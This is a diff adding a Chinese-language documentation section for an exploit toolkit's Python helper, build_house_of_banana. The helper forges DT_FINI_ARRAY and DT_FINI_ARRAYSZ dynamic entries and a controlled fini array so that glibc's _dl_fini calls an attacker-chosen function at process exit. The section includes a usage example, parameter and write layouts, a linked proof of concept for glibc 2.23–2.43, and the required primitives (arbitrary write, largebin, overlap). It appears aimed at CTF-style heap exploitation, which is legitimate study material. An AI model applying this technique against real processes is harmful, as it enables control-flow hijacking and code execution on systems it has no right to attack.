@@ -65,6 +65,113 @@ while (count-- > 0)
 
 可执行部分不猜私有偏移；需要伪造独立 link_map 时，直接按文件末尾的中文伪代码和附件 ld.so 重算。
 
+## Python 离线板子
+
+[`banana.py`](./banana.py) 提供 `build_house_of_banana`，生成 `_dl_fini` 消费 `DT_FINI_ARRAY` 所需的动态项和数组。
+
+### 函数用途
+
+构造 `exit -> _dl_fini` 消费的最终对象：
+
+```text
+array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr
+count = l_info[DT_FINI_ARRAYSZ]->d_un.d_val / 8
+while (count--) ((fini_t) array[count])();
+```
+
+### 对应 PoC
+
+- [`poc_fini_array_sink_2.23_2.43.c`](./poc_fini_array_sink_2.23_2.43.c)。
+
+### 动态项常量
+
+```text
+DT_FINI_ARRAY   = 26
+DT_FINI_ARRAYSZ = 28
+```
+
+每个 `Elf64_Dyn` 是 0x10 字节：
+
+```text
++0x00  d_tag
++0x08  d_un（d_ptr 或 d_val）
+```
+
+### 最小使用示例
+
+```python
+from banana import build_house_of_banana
+
+writes = build_house_of_banana(
+    fini_dyn_addr=0x7fff1000,      # DT_FINI_ARRAY 动态项地址
+    fini_size_dyn_addr=0x7fff1010, # DT_FINI_ARRAYSZ 动态项地址
+    fini_array_addr=0x500000,      # 受控 fini 数组
+    callback_addr=0x401234,        # 数组中被调用的函数
+    link_map_base=0x7fff0000,      # 目标 map 的 l_addr
+    array_count=1,
+)
+
+# 三个 MemoryWrite：
+# 1. DT_FINI_ARRAY Dyn
+# 2. DT_FINI_ARRAYSZ Dyn
+# 3. controlled fini array
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
+```
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `fini_dyn_addr` | `DT_FINI_ARRAY` 对应的 `Elf64_Dyn` 地址。 |
+| `fini_size_dyn_addr` | `DT_FINI_ARRAYSZ` 对应的 `Elf64_Dyn` 地址。 |
+| `fini_array_addr` | 进程中长期存活的受控 fini 函数数组地址。 |
+| `callback_addr` | 数组中被 `_dl_fini` 调用的函数地址。 |
+| `link_map_base` | 目标 map 的 `l_addr`；`d_ptr = fini_array_addr - l_addr`。 |
+| `array_count` | 数组元素数量，默认 1；动态项中保存的是字节数 `count * 8`。 |
+
+### 返回对象
+
+返回三个 `MemoryWrite`。`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+各写入内容：
+
+```text
+1. DT_FINI_ARRAY Dyn（fini_dyn_addr 处，0x10 字节）：
+       d_tag = 26
+       d_ptr = fini_array_addr - link_map_base
+
+2. DT_FINI_ARRAYSZ Dyn（fini_size_dyn_addr 处，0x10 字节）：
+       d_tag = 28
+       d_val = array_count * 8
+
+3. controlled fini array（fini_array_addr 处）：
+       array_count 个 callback_addr
+```
+
+### 调用者必须提供
+
+```text
+libc/ld 基址和私有 link_map 布局（Build ID 相关）
+能改写目标 map 动态项的原语（AAW / largebin / overlap）
+进程能走到 exit，且 fake map 满足 _dl_fini 枚举和 l_init_called
+```
+
+### 函数不负责
+
+```text
+不生成私有 link_map
+不负责命名空间 _ns_loaded / _ns_nloaded
+不负责 l_real / l_init_called
+不处理 2.42+ 的替代投递原语
+```
+
 ## 迁移与调试
 
 1. 先确认投递路径和最终触发点在目标 Build ID 上都确实存在。
